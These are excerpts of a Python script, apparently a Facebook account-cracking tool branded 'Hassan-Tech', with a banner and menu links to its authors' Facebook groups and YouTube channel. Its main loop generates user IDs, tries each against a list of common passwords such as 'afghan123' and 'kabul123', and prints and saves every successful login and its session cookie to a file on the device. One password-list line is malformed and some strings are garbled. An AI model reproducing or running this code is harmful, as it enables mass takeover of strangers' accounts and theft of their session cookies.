...
        afg()
    if shahzad == '2':
        os.system('xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share&mibextid=I6gGtw:')
        main_menu()
    if shahzad == '3':
        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
        main_menu()
    if shahzad == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100065417499806/')
        main_menu()
    if shahzad == '0':
        os.system('exit')
        return None
...
        r = BeautifulSoup(session.get('https://m.facebook.com/groups/4619616058120223/?ref=share&mibextid=I6gGtw', {
...
    __    __     ____      _____    _____     ____        __      _  
(  \  /  )   (    )    / ____\  / ____\   (    )      /  \    / ) 
 \ (__) /    / /\ \   ( (___   ( (___     / /\ \     / /\ \  / /  
  ) __ (    ( (__) )   \___ \   \___ \   ( (__) )    ) ) ) ) ) )  
 ( (  ) )    )    (        ) )      ) )   )    (    ( ( ( ( ( (   
...
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Hassan
 KARIMI && SHAHZAD Hassan 
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mHassan Karimi && Hassan 
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTRAIL
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mHassan_Tech && SKING-TECH
...
        for love in user:
            uid = code+love
            pwx = [love,uid,'Û±Û²Û³Û´ÛµÛ¶','afghan123','kabul123','afghanistan','50006000','۱۰۰۲۰۰','۱۲۳۴۵۶۷۸۹','۵۰۰۶۰۰','500500','۱۲۳۴۵۶','700800'654321,]
...
                cid = coki[7:22]
                print('\033[1;32m[Hassan-Tech -OK]  ' +cid+ ' | ' +ps+'  \n \033[1;33m COOKIE = \033[1;32m'+coki+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Hassan-Tech -OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;30m[Hassan-Tech-CP🤕]  ' +cid+ ' | ' +ps+'  \33[0;97m')
...
                continue
        loop+=1
        sys.stdout.write('\r%s[Hassan-Tech] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
